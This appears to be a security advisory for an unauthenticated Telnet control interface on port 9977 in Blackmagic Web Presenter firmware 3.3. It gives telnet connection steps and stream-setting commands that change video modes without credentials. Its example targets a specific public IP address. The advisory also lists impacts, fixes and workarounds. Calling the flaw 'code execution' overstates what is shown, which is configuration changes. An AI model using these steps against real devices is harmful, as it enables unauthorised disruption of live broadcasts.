# Blackmagic Web Presenter – Code Execution (CE)

## Product
**Blackmagic Web Presenter**  
**Firmware/Software Version**: 3.3

## Vulnerability Type
- Code Execution (CE)

## Vulnerable Component(s)
- Embedded Telnet control interface

## Vulnerable Endpoint(s)
- `telnet://<target-ip>:9977`

## Attack Vector(s)
- Remote unauthenticated Telnet session over TCP port 9977

---

## Description

Blackmagic Web Presenter version 3.3 exposes a Telnet service on port `9977` that accepts unauthenticated commands. This service allows remote attackers to manipulate stream settings, including changing video modes and possibly altering device functionality. No credentials or authentication mechanisms are required to interact with the Telnet interface.

---

## Exploitation

### Steps to Reproduce:

1. Connect to the device using Telnet:

    ```bash
    telnet <target-ip> 9977
    ```

2. Send stream configuration commands:

    ```
    STREAM SETTINGS:
    Video Mode: 2160p60
    ```

3. Observe response:

    - If the command succeeds:
        ```
        ACK
        ```
    - If the command fails:
        ```
        NACK
        ```

---

## Example

```bash
telnet 221.149.191.210 9977
```
Send configuration commands, for example:

```bash
STREAM SETTINGS:
Video Mode: 2160p60

```
Expected response:

```bash
ACK
```

if unsuccessful:

```bash
NACK
```

## Proof of Concept (PoC) for(CE,Information Disclosure)
![Image](https://github.com/user-attachments/assets/a2c8f895-1296-4296-a4d5-2bd94988955f)

https://github.com/user-attachments/assets/5b02b52f-0c53-451a-80ef-4a03fa3a2027

## Impact

An attacker with network access can:

    Modify critical stream parameters

    Alter encoder behavior

    Disrupt live broadcasts

    Perform denial-of-service on the stream path

    Potentially escalate to other attack paths due to configuration changes

## Suggested Fixes

    Disable or restrict access to port 9977 via firewall or access control lists (ACLs)

    Authenticate all connections to Telnet services

    Update the device firmware if newer secure versions are released by Blackmagic

    Implement logging and alerting on unexpected Telnet access attempts

## Workarounds

    Place the device behind a VPN or internal network segmentation

    Use a hardware firewall to block access to port 9977

    Monitor all outbound stream changes for anomalies

## Affected Component(s)

    Embedded Telnet control interface on port 9977

## Attack Vector(s)

    Unauthenticated remote Telnet session over TCP (port 9977)
